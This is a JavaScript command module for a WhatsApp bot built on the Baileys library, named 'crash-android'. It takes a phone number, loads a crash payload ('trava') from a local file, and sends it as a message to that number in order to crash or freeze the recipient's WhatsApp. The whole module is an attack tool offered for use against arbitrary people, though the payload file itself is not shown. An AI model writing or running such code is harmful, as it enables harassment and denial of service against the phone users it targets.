import { jidDecode } from '@whiskeysockets/baileys'
import fs from 'fs'
import path from 'path'

const crashMisaFinal = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola'],
    category: 'tools',
    noPrefix: true,

    run: async (conn, m, { args, command }) => {
        // 1. Verificación básica de respuesta
        if (!args[0]) {
            return conn.sendMessage(m.chat, { 
                text: `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]` 
            }, { quoted: m })
        }

        try {
            // 2. Ruta al archivo ola.js dentro de tu carpeta travas
            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js')
            
            if (!fs.existsSync(pathTrava)) {
                return m.reply('❌ No encontré el archivo: travas/ola.js')
            }

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf-8')
            const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            // 3. Ejecución
            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
            await conn.sendMessage(target, { text: contenidoTrava })

        } catch (err) {
            console.error(err)
            // No enviamos nada si falla para no loopear
        }
    }
}

export default crashMisaFinal
